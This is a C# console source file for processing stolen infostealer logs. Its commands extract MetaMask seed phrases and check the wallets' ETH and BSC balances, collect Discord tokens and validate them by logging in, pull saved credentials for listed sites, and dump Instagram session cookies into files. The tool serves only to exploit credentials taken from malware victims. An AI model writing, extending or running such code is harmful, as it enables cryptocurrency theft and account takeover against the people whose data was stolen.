using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Discord;
using Core.Parsers;
using Core.Wallets;
using Microsoft.Extensions.Configuration;

namespace Console.Views;

public class MainView : ArgsView
{
    private readonly Settings _settings;
    private readonly IConfiguration _config;
    
    public MainView(IRoot root, Settings settings, IConfiguration config) : base(root)
    {
        _settings = settings;
        _config = config;
    }
    
    [Command]
    public async Task Wallets()
    {
        Directory.CreateDirectory("Wallets");

        await using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
        {
            Access = FileAccess.ReadWrite,
            Mode = FileMode.OpenOrCreate,
        });
        mnemonics.BaseStream.Position = mnemonics.BaseStream.Length;
        var checker = new MetamaskChecker(_config["Web3:Eth"]!, _config["Web3:Bsc"]!);
        
        foreach (var wallet in new MetamaskParser().ByLogs(_settings.Path).DistinctBy(x => x?.Mnemonic))
        {
            if (wallet is not {Mnemonic:not null, Password:not null} ||
                wallet.Mnemonic.Split(' ').Length != 12) continue;
            
            System.Console.WriteLine(wallet.Mnemonic);
            await mnemonics.WriteLineAsync(wallet.Mnemonic);
            
            foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
            {
                System.Console.WriteLine(account.Name);
                System.Console.WriteLine(account.Address);
                
                foreach (var balance in await checker.Balance(account.Address))
                {
                    System.Console.WriteLine($"{balance.Key}: {balance.Value}");
                }
            }
        }

        _ExitWait();
    }

    [Command]
    public Task Discord()
    {
        Directory.CreateDirectory("Discord");
        
        StreamWriter? all, invalid = null, valid = null;

        var checker = new DiscordChecker();
        
        System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies

        var check = System.Console.ReadKey(true).Key == ConsoleKey.Y;

        all = new StreamWriter("Discord/tokens.txt", true);
        
        if (check)
        {
            invalid = new StreamWriter("Discord/invalid.txt", true);
            valid = new StreamWriter("Discord/valid.txt", true);
        }

        foreach (var token in new DiscordParser().ByLogs(_settings.Path).Distinct())
        {
            all.WriteLine(token);

            if (!check) continue;

            if (checker.TryLogin(token) is {} account)
            {
                System.Console.WriteLine($"Token: {token}\nFriends: {checker.Friends(account)?.Count() ?? 0}");
                valid!.WriteLine(token);
            }
            else
                invalid!.WriteLine(token);
        }

        all.Dispose();
        invalid?.Dispose();
        valid?.Dispose();

        _ExitWait();
        return Task.CompletedTask;
    }

    [Command]
    public Task Links()
    {
        Directory.CreateDirectory("Links");

        using var writer = new StreamWriter("Links/links.txt", true);
        var links = File.ReadAllLines("links.txt");
        
        foreach (var account in links.FromLogs(_settings.Path))
        {
            System.Console.WriteLine(account.ToString());
            writer.WriteLine(account.ToString());
        }

        _ExitWait();
        return Task.CompletedTask;
    }

    [Command]
    public Task Instagram()
    {
        var folder = $"Cookies/{new DirectoryInfo(_settings.Path).Name}";
        Directory.CreateDirectory(folder);

        var i = 0;
        foreach (var cookies in ".instagram.com".FromLogs(_settings.Path).Where(x => x.Any()))
        {
            File.WriteAllLines($"{folder}/cookies{i}.txt", cookies);

            i++;
        }
        
        _ExitWait();
        return Task.CompletedTask;
    }
    
    private static void _ExitWait()
    {
        System.Console.Beep();
        System.Console.WriteLine("Press any key for continue");
        System.Console.ReadKey(true);
    }
}